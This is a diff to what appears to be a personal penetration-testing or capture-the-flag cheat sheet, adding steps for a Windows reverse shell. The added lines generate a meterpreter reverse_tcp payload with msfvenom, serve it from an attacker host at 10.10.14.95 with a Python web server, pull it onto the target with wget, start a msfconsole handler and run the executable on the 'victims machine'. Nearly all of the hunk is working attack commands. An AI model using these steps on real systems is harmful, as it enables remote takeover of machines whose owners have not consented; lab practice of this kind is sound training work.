@@ -19,8 +19,20 @@ ___
 
 Use [revshells](https://www.revshells.com/) msfvenom session to generate a payload
 `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.95 LPORT=9001 -f exe -o reverse.exe`
+
 transfer the exe to the machine
-``
+`sudo python3 -m http.server 80`
+`wget http://10.10.14.95/reverse.exe -o reverse.exe`
+
+Set up a listener in msfconsole:
+`sudo msfconsole`
+`use multi/handler`
+`set payload windows/x64/meterpreter/reverse_tcp
+`set lport 9001`
+`set lhost 10.10.14.95`
+`exploit`
+Run it on the victims machine:
+`./reverse.exe`
 
 ### Basics
 View categories
